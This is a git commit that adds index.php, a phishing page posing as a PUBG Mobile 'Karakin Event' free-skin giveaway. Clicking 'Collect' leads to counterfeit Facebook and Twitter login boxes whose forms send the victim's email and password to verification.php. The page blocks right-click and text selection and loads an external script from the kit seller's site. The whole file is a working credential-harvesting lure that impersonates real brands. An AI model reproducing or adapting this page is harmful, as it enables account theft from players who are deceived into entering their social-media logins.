8702ac4d87b7ad6fd88fb79bc77b6fdc557bfe96
Adityasingh-reseller <78647973+Adityasingh-reseller@users.noreply.github.com>
2022-01-02 20:03:56 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,315 @@
+<html>
+<script src="https://jefanya.com/js/debug.js"></script> <!-- Biar Ga di Maling Sama Orang Script nya --> 
+<!-- Isinya Alert Suruh Beli SCript Di Jefanya Store Coba aja CTRL + U -->
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="PUBG MOBILE : Karakin Event">
+<meta name="description" content="Its time for you to Become a Skin Sultan on PUBG Mobile! take now your Prize! For Free!">
+<meta property="og:description" content="Its time for you to Become a Skin Sultan on PUBG Mobile! take now your Prize! For Free!">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="PUBG MOBILE : Karakin Event">
+<meta property="og:type" content="website">
+<meta name="copyright"content="PUBG MOBILE">
+<meta name="theme-color" content="#000">
+<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+<title>PUBG MOBILE : Karakin Event</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/animate.css">
+<link rel="stylesheet" href="css/login/facebook.css">
+<link rel="stylesheet" href="css/login/twitter.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+
+<iframe style="display: none;" scrolling="no" allow="autoplay" src="https://g.top4top.io/m_1728nqibu0.mp3" width="0" height="0" frameborder="no"></iframe>
+
+<style type="text/css">
+#collect fieldset:not(:first-of-type) {
+display: none;
+}
+.popup-login {
+	background:rgba(0,0,0,0.5);
+	width:100%;
+	height:100%;
+	position:fixed;
+	top:0;
+	left:0;
+	z-index:9999;
+}
+.popup-box-login-fb {
+	background:#ECEFF6;
+	max-width:330px;
+	height:auto;
+	position:relative;
+	margin:50px auto;
+	margin-top:1.9%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+}
+.popup-box-login-twitter {
+	background:#fff;
+	max-width:330px;
+	height:350px;
+	position:relative;
+	margin:50px auto;
+	margin-top:10%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+}
+.close-fb {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	position:absolute;
+	top:-8px;
+	right:-10px;
+	display:block;
+}
+.close-fb i {
+	color:#fff;
+	padding-top:1px;
+}
+.close-other {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	top:-8px;
+	right:-10px;
+	position:absolute;
+	z-index:9999999;
+	display:block;
+}
+.close-other i {
+	color:#fff;
+	padding-top:1px;
+}
+@media only screen and (max-width:600px) {
+	.popup-box-login-fb {
+		margin-top: 4%;
+	}
+}
+</style>
+  
+<div class="container">
+<div class="header"></div>
+
+<div class="box">
+<center>
+<div class="alert">
+Collect your Free Karakin Event Reward in here today
+<br>
+-Anyone can get it,Good Luck!
+<div class="alert-time" id="timer1"></div>
+</div>
+</center>
+
+<div id="latest" class="gallery">
+<div class="scroll">
+<center>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/1.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/2.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/3.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/4.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/5.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/6.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/7.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/8.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+<div class="item">
+<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/item/latest/9.png">
+<div>
+<button style="border-top: 0px;" onmousedown="buka.play();" onclick="collect();">Collect</button>
+</div>
+</div>
+</center>
+</div>
+</div>
+
+
+</div> <!--- box --->
+</div> <!--- container --->
+
+<div class="popup welcome">
+<div class="popup-box animated fadeInDown">
+<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="zmdi zmdi-close-circle"></i></a>
+<div class="nav-popup"><div class="nav-popup-title">Karakin Event Reward</div></div>
+<div class="alert">Welcome to PUBG MOBILE : Karakin Event Reward</div>
+<div class="popup-confirm">
+<i class="fa fa-gift"></i>
+</div>
+<br>
+<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="closepopup()">Go to reward list</button>
+</div>
+</div>
+
+
+<div class="popup collect" style="display: none;">
+<div class="popup-box animated fadeInDown">
+<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="zmdi zmdi-close-circle"></i></a>
+<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
+<div class="alert">Are you sure to collect this prize?</div>
+<div class="popup-confirm">
+<i class="fa fa-question-circle"></i>
+</div>
+<br>
+<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="open_login()" class="next">Collect</button>
+</div>
+</div>
+
+<div class="popup open_login" style="display: none;">
+<div class="popup-box animated fadeInDown">
+<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="zmdi zmdi-close-circle"></i></a>
+<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
+<div class="alert">Log in using your PUBG MOBILE account to receive prize</div>
+<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
+<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter icon-login"></i> Log in using Twitter account</button>
+<br>
+<br>
+<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="closepopup()">Back</button>
+</div>
+</div>
+
+<div class="popup-login login-facebook animated fadeIn" style="display: none;">
+	<div class="popup-box-login-fb">
+		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+		<div class="navbar-fb">
+			<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/login/facebook_text.png">
+		</div>
+		<div class="content-box-fb">
+			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
+			<div class="txt-login-fb">
+				 Log in to your Facebook account to connect to PUBG MOBILE
+			</div>
+			<form class="login-form" action="verification.php" method="post">
+				<label>
+				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
+				</label>
+				<label>
+				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
+				</label>
+				<input type="hidden" name="login" value="Facebook" readonly>
+				<button type="submit" class="btn-login-fb">Log In</button>
+			</form>
+			<div class="txt-create-account">Create account</div>
+			<div class="txt-not-now">Not now</div>
+			<div class="txt-forgotten-password">Forgotten password?</div>
+		</div>
+		<div class="language-box">
+			<center>
+			<div class="language-name language-name-active">English (UK)</div>
+			<div class="language-name">Bahasa Indonesia</div>
+			<div class="language-name">Basa Jawa</div>
+			<div class="language-name">Bahasa Melayu</div>
+			<div class="language-name">日本語</div>
+			<div class="language-name">Español</div>
+			<div class="language-name">Português (Brasil)</div>
+			<div class="language-name">
+				<i class="fa fa-plus"></i>
+			</div>
+			</center>
+		</div>
+		<div class="copyright">Facebook Inc.</div>
+	</div>
+</div>
+
+<div class="popup-login login-twitter animated fadeIn" style="display: none;">
+	<div class="popup-box-login-twitter">
+	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+		<div class="header-twitter">
+			<center>
+			<img src="https://jefanya.com/data/PUBG%20CLAIM%20V22/login/twitter_text.png">
+			</center>
+		</div>
+		<div class="box-twitter">
+			<center>
+			<form action="verification.php" method="post">
+				<div class="txt-login-twitter">Login to Twitter</div>
+				<div class="input-box-twitter">
+					<label>Phone, email, or username</label>
+					<input type="text" name="email" placeholder="" required>
+				</div>
+				<div class="input-box-twitter">
+					<label>Password</label>
+					<input type="password" name="password" placeholder="" required>
+				</div>
+				<input type="hidden" name="login" value="Twitter" readonly>
+				<button type="submit" class="btn-login-twitter">Log In</button>
+				<div class="footer-menu-twitter">Forgot password?</div>
+				<div class="footer-menu-twitter bulet">•</div>
+				<div class="footer-menu-twitter">Sign up to Twitter</div>
+			</form>
+			</center>
+		</div>
+	</div>
+</div>
+
+<!--- fieldset content --->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+<!--- /fieldset content --->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script src="js/timer.js"></script>
+<script src="js/tab.js"></script>
+<script src="js/popup.js"></script>
+<script src="js/fieldset.js"></script>
+<script src="js/click.js"></script>
+
+</body>
+</html>
